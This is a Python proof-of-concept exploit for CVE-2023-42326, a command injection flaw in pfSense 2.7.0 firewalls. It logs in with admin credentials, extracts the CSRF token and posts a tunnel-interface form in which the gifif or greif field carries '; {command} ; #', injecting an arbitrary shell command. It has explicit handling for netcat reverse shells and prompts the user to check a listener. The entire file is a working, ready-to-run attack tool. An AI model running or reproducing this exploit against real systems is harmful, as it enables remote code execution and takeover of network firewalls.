import requests
import argparse
import sys
from datetime import datetime
from rich.console import Console
from rich.progress import Progress
from rich import box
from bs4 import BeautifulSoup
import threading
import urllib3

# Suppress InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize Rich Console
console = Console()

# Function to parse command-line arguments
def parse_args():
    parser = argparse.ArgumentParser(description="pfSense 2.7.0 Command Injection Exploit PoC (CVE-2023-42326)")
    parser.add_argument('-u', '--username', required=True, help='Username for pfSense admin login')
    parser.add_argument('-p', '--password', required=True, help='Password for pfSense admin login')
    parser.add_argument('-t', '--target', required=True, help='Target pfSense IP (e.g., http://10.101.1.1)')
    parser.add_argument('--mode', required=True, choices=['gif', 'gre'], help='Exploit mode: gif or gre')
    parser.add_argument('-c', '--command', required=True, help='Command to inject')
    parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode to print response data')
    parser.add_argument('--insecure', action='store_true', help='Allow insecure server connections when using SSL (similar to curl -k)')
    return parser.parse_args()

# Function to print the banner
def print_banner():
    banner = r"""
██████╗ ███████╗██████╗ ██╗    ██╗███╗   ██╗███╗   ███╗███████╗
██╔══██╗██╔════╝██╔══██╗██║    ██║████╗  ██║████╗ ████║██╔════╝
██████╔╝█████╗  ██████╔╝██║ █╗ ██║██╔██╗ ██║██╔████╔██║█████╗  
██╔═══╝ ██╔══╝  ██╔═══╝ ██║███╗██║██║╚██╗██║██║╚██╔╝██║██╔══╝  
██║     ██║     ██║     ╚███╔███╔╝██║ ╚████║██║ ╚═╝ ██║███████╗
╚═╝     ╚═╝     ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚═╝     ╚═╝╚══════╝

Done with ❤️  by @bl4ckarch                                                            
"""
    console.print(f"[bold cyan]{banner}[/bold cyan]")

# Function to get current timestamp for logging
def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# Function to check if the target is reachable
def check_target_reachable(target, insecure):
    try:
        response = requests.get(f"{target}/", verify=not insecure)
        if response.status_code == 200:
            console.print(f"[{timestamp()}] [bold green][SUCCESS] Target {target} is reachable[/bold green]")
            return True
        else:
            console.print(f"[{timestamp()}] [bold red][ERROR] Target {target} responded with status code {response.status_code}[/bold red]")
            return False
    except requests.exceptions.RequestException as e:
        console.print(f"[{timestamp()}] [bold red][ERROR] Target {target} is unreachable: {str(e)}[/bold red]")
        return False

# Function to extract CSRF token from a page
def get_csrf_token(session, target, url_path, insecure, debug):
    full_url = f"{target}/{url_path}"
    console.print(f"[{timestamp()}] [bold cyan][INFO] Fetching CSRF token from: {full_url}[/bold cyan]")
    response = session.get(full_url, verify=not insecure)

    if response.status_code != 200:
        console.print(f"[{timestamp()}] [bold red][ERROR] Failed to fetch page {url_path}[/bold red]")
        return None

    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': '__csrf_magic'})

    if csrf_token and csrf_token['value']:
        console.print(f"[{timestamp()}] [bold green][SUCCESS] CSRF token extracted successfully[/bold green]")
        if debug:
            console.print(f"[{timestamp()}] [bold yellow][DEBUG] CSRF token: {csrf_token['value']}[/bold yellow]")
        return csrf_token['value']
    else:
        console.print(f"[{timestamp()}] [bold red][ERROR] Failed to extract CSRF token from {url_path}[/bold red]")
        return None

# Function to login to pfSense and return session
def login(session, target, username, password, insecure, debug):
    csrf_token = get_csrf_token(session, target, "", insecure, debug)
    if not csrf_token:
        sys.exit(1)

    login_url = f"{target}/"
    login_data = {
        "__csrf_magic": csrf_token,
        "usernamefld": username,
        "passwordfld": password,
        "login": "Sign In"
    }

    console.print(f"[{timestamp()}] [bold cyan][INFO] Sending login request to {login_url}[/bold cyan]")
    response = session.post(login_url, data=login_data, verify=not insecure)

    if response.status_code == 200 and "dashboard" in response.text.lower():
        console.print(f"[{timestamp()}] [bold green][SUCCESS] Logged in successfully[/bold green]")
        return True
    else:
        console.print(f"[{timestamp()}] [bold red][ERROR] Failed to log in, check username and password[/bold red]")
        return False

# Function to send the exploit request with timeout handling
def send_exploit(session, exploit_url, data, mode, insecure, debug):
    console.print(f"[{timestamp()}] [bold cyan][INFO] Sending {mode.upper()} exploit request to {exploit_url}[/bold cyan]")
    with Progress() as progress:
        task = progress.add_task(f"[cyan]Sending {mode.upper()} exploit...", total=100)
        for _ in range(100):
            progress.update(task, advance=1)

    try:
        # Send the exploit request with a timeout of 10 seconds
        exploit_response = session.post(exploit_url, data=data, timeout=10, verify=not insecure)

        if debug:
            console.print(f"[{timestamp()}] [bold yellow][DEBUG] Exploit response data: {exploit_response.text[:500]}[/bold yellow]")

        if exploit_response.status_code == 200:
            console.print(f"[{timestamp()}] [bold green][SUCCESS] {mode.upper()} Exploit sent successfully[/bold green]")
        else:
            console.print(f"[{timestamp()}] [bold red][ERROR] Failed to send the {mode.upper()} exploit[/bold red]")
    except requests.exceptions.Timeout:
        console.print(f"[{timestamp()}] [bold yellow][WARNING] Request timed out. Reverse shell might have been triggered. Check your listener![/bold yellow]")

# Consolidated exploit function for both GIF and GRE
def exploit(session, target, command, mode, insecure, debug):
    # Determine URL and parameter based on the mode
    url_path = "interfaces_gif_edit.php" if mode == 'gif' else "interfaces_gre_edit.php"
    param_name = "gifif" if mode == 'gif' else "greif"

    # Fetch CSRF token
    csrf_token = get_csrf_token(session, target, url_path, insecure, debug)
    if not csrf_token:
        sys.exit(1)

    exploit_url = f"{target}/{url_path}"
    
    # Build malicious data payload with injected command
    malicious_data = {
        "__csrf_magic": csrf_token,
        "if": "wan",  # Parent interface
        "remote-addr": "10.10.10.2",  # Peer address
        "tunnel-local-addr": "127.0.0.1",  # Local address
        "tunnel-remote-addr": "10.10.10.2",  # Remote address
        "tunnel-remote-net": "16",  # Subnet for the tunnel
        "descr": "testpoc",  # Description
        param_name: f"; {command} ; #",  # Injected command payload
        "save": "Save"  # Save operation
    }

    # If command contains 'nc', use threading
    if "nc" in command:
        console.print(f"[{timestamp()}] [bold blue][INFO] Netcat command detected. Running exploit in a new thread.[/bold blue]")
        thread = threading.Thread(target=send_exploit, args=(session, exploit_url, malicious_data, mode, insecure, debug))
        thread.start()

        # Inform the user to check their reverse shell listener
        console.print(f"[{timestamp()}] [bold yellow][INFO] Check your reverse shell listener window[/bold yellow]")
    else:
        send_exploit(session, exploit_url, malicious_data, mode, insecure, debug)

def main():
    # Print banner
    print_banner()

    # Parse arguments
    args = parse_args()

    # Create a session to persist cookies
    session = requests.Session()

    # Step 1: Check if the target is reachable
    if not check_target_reachable(args.target, args.insecure):
        sys.exit(1)

    # Step 2: Log in to pfSense
    if not login(session, args.target, args.username, args.password, args.insecure, args.debug):
        sys.exit(1)

    # Step 3: Execute the command injection exploit with the chosen command
    exploit(session, args.target, args.command, args.mode, args.insecure, args.debug)

if __name__ == "__main__":
    main()
